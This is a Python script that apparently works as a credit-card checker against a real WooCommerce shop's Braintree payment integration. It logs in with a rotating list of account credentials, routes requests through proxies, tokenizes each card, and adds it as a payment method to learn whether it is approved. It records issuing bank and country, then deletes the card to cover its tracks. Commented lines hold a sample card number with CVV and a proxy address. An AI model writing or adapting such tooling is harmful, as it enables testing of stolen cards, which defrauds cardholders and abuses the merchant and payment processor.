import requests,secrets,json,time,base64
from bs4 import BeautifulSoup 
from datetime import datetime
import requests.cookies
from user_agent import generate_user_agent
import re,pycountry,os
from kvsqlite.sync import Client


def prox(proxy,req):
    if proxy == "none":
        try:
            proxies_file = open('C:/Users/aa846/Desktop/New folder (3)/Test/files/LIVE proxy.txt','r+')
            read_proxies = proxies_file.read().splitlines()
            pr = secrets.choice(read_proxies)
            proxies_file.close()
        except:
            proxies_file = open('C:/Users/aa846/Desktop/New folder (3)/Test/files/all live proxy.txt','r+')
            read_proxies = proxies_file.read().splitlines()
            pr = secrets.choice(read_proxies)
            proxies_file.close()
        req.proxies = {"https":f"http://{pr}","http":f"http://{pr}"}
    
    else:
        req.proxies = {"https":f"http://{proxy}","http":f"http://{proxy}"}


def log(req,user_agent):
    global email,password
    acc =  open("accounts.txt","r")
    rd = acc.readlines()
    acc.close()
    db = Client("data.db")
    done = False
    while done != True:
        rnd = secrets.choice(rd)
        rnd_index = rd.index(rnd)
        email_pass = rnd.split("\n")[0]
        email = str(email_pass.split(":")[0])
        password = str(email_pass.split(":")[1])
        db.cleanex()
        getif = db.exists(email)
        if getif == True:
            done = False
            pass
        else:
            done = True
    db.setex(key=email,value=True,ttl=30)
    db.close()

    try:
        coock = email_pass.split("{")[1]
        coock = ("{"+coock).replace("\'","\"")
        req.cookies.update(json.loads(coock))
        headers = {'referer': 'https://californiabalsamic.com/my-account/payment-methods/','user-agent': user_agent}
        response = req.get('https://californiabalsamic.com/my-account/add-payment-method/', cookies=req.cookies, headers=headers,timeout=None)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
        coock = True
        return(response.text)
    except:
        coock = None

    if coock == None:
        req_login = requests.Session()
        headers = {
    'origin': 'https://californiabalsamic.com',
    'referer': 'https://californiabalsamic.com/my-account/',
    'user-agent': generate_user_agent()}
        response = req_login.get(url='https://californiabalsamic.com/my-account/',headers=headers,timeout=15)
        woocommerce_login = re.search('''name="woocommerce-login-nonce" value="(.*?)" ''',response.text).group(1)

        data = {
    'username': email,
    'password': password,
    'woocommerce-login-nonce': woocommerce_login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

        response = req_login.post('https://californiabalsamic.com/my-account/', headers=headers, data=data,timeout=None)
        login = re.search('''Hello''',response.text)
        if login != None:
            coockies = req_login.cookies.get_dict()
            req.cookies.update(coockies)
            rd[rnd_index] = email+":"+password+":"+str(coockies)+"\n"
            with open("accounts.txt","w") as file:
                file.writelines(rd)
                file.close()
            return(True)
        else:
            return(False)

def payment(cc,mm,yy,cvv,req,user_agent,login,proxy):
    card = cc+"|"+mm+"|"+yy+"|"+cvv
    try:
        if login == True or login == False:
            headers = {'referer': 'https://californiabalsamic.com/my-account/payment-methods/','user-agent': user_agent}
            response = req.get('https://californiabalsamic.com/my-account/add-payment-method/', cookies=req.cookies, headers=headers,timeout=None).text
        else:
            response = login
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response).group(1)
        enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response).group(1)
        dec = json.loads(base64.b64decode(enc).decode('utf-8'))
        au=dec["authorizationFingerprint"]
        headers = {
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
       'origin': 'https://assets.braintreegateway.com',
       'referer': 'https://assets.braintreegateway.com/',
       'user-agent': user_agent}
        json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '8188bf67-d93b-4956-8777-b47a691c5bd1',} ,
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10001',
                        'streetAddress': ''} ,
                                },
                'options': {
                    'validate': False,
                            },
                    },
                },
    'operationName': 'TokenizeCreditCard'}
        response = req.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data,timeout=None).json()
        tok = response["data"]["tokenizeCreditCard"]["token"]
        ########country
        try:
            alpha_3 = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["countryOfIssuance"]
            coun = str(pycountry.countries.get(alpha_3=alpha_3))
            alpha_2 = re.findall('''alpha_2=\'(.*?)\'''',coun)[0]
            def country_code_to_emoji(alpha_2):
                return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in alpha_2.upper())
            country = re.findall('''name=\'(.*?)\'''',coun)[0] +" "+country_code_to_emoji(alpha_2)
            bank = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["issuingBank"]
            prepaid = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["prepaid"]
        except:
            country,bank,prepaid = None,None,None

        headers = {
    'origin': 'https://californiabalsamic.com',
    'referer': 'https://californiabalsamic.com/my-account/add-payment-method/',
    'user-agent': user_agent}
        data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"af68d74b8544b687a97f6e2543d6c949","fraud_merchant_id":null,"correlation_id":"0769597578845b71ada15053b306f40a"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': str(dec).replace("\'","\""),
    'billing_address_1': '',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1'}
        response = req.post('https://californiabalsamic.com/my-account/add-payment-method/', cookies=req.cookies, headers=headers, data=data,timeout=None)
        text = response.text
        bs = BeautifulSoup(text,'html.parser')
        try:
            woo_error = bs.find_all('ul',attrs={"class":"woocommerce-error"})
            result = str(woo_error).split("Reason: ")[1].split("\t")[0]
            if '''risk_threshold''' in result:
                result = '''RISK: Retry this BIN later.'''
        except:
            if '''Nice! New payment method added''' in text or '''Payment method successfully added.''' in text:
                result = '''Approved'''
            elif "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds." in text:
                result = "SPAM"
            else:
                result = '''Error'''
        #print(result)
        #url_logout = str(bs.find_all("li",attrs={"class":"woocommerce-MyAccount-navigation-link woocommerce-MyAccount-navigation-link--customer-logout"})).split("href=")[1].split("\"")[1]
        if "Approved" in result:
            url_delet = str(bs.find_all("a",attrs={"class":"button delete"})).split("href=")[1].split("\"")[1]
            return{"card": card, "response": result,"country":country,"bank":bank,"url_delet":str(url_delet),"proxy":proxy}
        else:
            return{"card": card, "response": result,"country":country,"bank":bank,"url_delet":None,"proxy":proxy}
    except Exception as error:
        print(error)
        return("error_proxy")


def delet(url_delet,req,email,password,user_agent):
    wpnonce = url_delet.split("=")[1]
    headers = {'referer': 'https://californiabalsamic.com/my-account/','user-agent': user_agent}
    params = {
    '_wpnonce': wpnonce}
    response = req.get(
    str(url_delet),
    params=params,
    cookies=req.cookies,
    headers=headers,timeout=None)
    if "Payment method deleted." in (response.text):
        pass
    else:
        print(f"ERROR DELET CARD.\nacc: {email}:{password}\n")

def start(cc,mm,yy,cvv,use_proxy,proxy):
    try:
        user_agent = generate_user_agent()
        t1 = datetime.now().replace(microsecond=0)
        req = requests.Session()
        #print(req.cookies)
        #add payment
        if use_proxy == True:
            prox(proxy,req)
        login = log(req,user_agent)
        if login == False:
            return{"error":f"error account ({email}:{password})"}
        chk = payment(cc,mm,yy,cvv,req,user_agent,login,proxy)
        if chk == "error_proxy":
            return{"error":f"your proxy is dd ({proxy})"}
        else:
            url_delet = chk["url_delet"]
            if url_delet != None:
                delet(url_delet,req,email,password,user_agent)
            t2 = datetime.now().replace(microsecond=0)
            timee = ((t2-t1).seconds)
            chk["time"] = timee
            return(chk)
    except Exception as error:
        print({"error":f"start:{error}"})
        time.sleep(1)
        pass

#cc = "4364340004104412"
#mm = "12"
#yy = "27"
#cvv = "273"
#use_proxy = True
#proxy = "15.204.161.192:18080"
#print(start("4364340004104412","12","27","273",use_proxy=False,proxy="none"))


        
